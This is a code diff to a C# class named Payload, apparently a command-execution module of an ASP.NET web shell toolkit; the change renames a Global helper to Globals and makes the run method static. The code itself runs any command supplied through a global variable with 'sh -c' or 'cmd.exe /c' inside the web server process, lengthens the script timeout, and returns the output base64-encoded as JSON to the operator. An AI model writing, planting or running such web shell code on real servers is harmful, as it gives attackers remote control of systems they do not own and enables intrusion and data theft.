@@ -17,7 +17,7 @@ public class Payload
         public string result = "";
     }
     Ret ret;
-    public string Run()//global: pwd, cmd, shell
+    public static string run()//global: pwd, cmd, shell
     {
         HttpContext.Current.Server.ScriptTimeout = 3600;
         ret = new Ret();
@@ -28,20 +28,20 @@ public class Payload
             pinfo.RedirectStandardOutput = true;
             pinfo.RedirectStandardError = true;
             pinfo.UseShellExecute = false;
-            pinfo.WorkingDirectory = Global.pwd;
-            if (Global.shell == "shell")
+            pinfo.WorkingDirectory = Globals.pwd;
+            if (Globals.shell == "shell")
             {
                 if(Environment.OSVersion.Platform == PlatformID.Unix){
                     pinfo.FileName = "sh";
-                    pinfo.Arguments = "-c " + Global.cmd;
+                    pinfo.Arguments = "-c " + Globals.cmd;
                 }else{
                     pinfo.FileName = "cmd.exe";
-                    pinfo.Arguments = "/c " + Global.cmd;
+                    pinfo.Arguments = "/c " + Globals.cmd;
                 }
             }
             else
             {
-                pinfo.FileName = Global.cmd;
+                pinfo.FileName = Globals.cmd;
             }
             p.Start();
             //p.WaitForExit();
@@ -59,13 +59,13 @@ public class Payload
                 output = output + stand_errors;
             ret.result = System.Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
             ret.code = 1;
-            return Global.json_encode(ret);
+            return Globals.json_encode(ret);
         }
         catch (Exception e)
         {
             ret.code = -1;
             ret.result = System.Convert.ToBase64String(Encoding.UTF8.GetBytes(e.ToString()));
-            return Global.json_encode(ret);
+            return Globals.json_encode(ret);
         }
 
     }
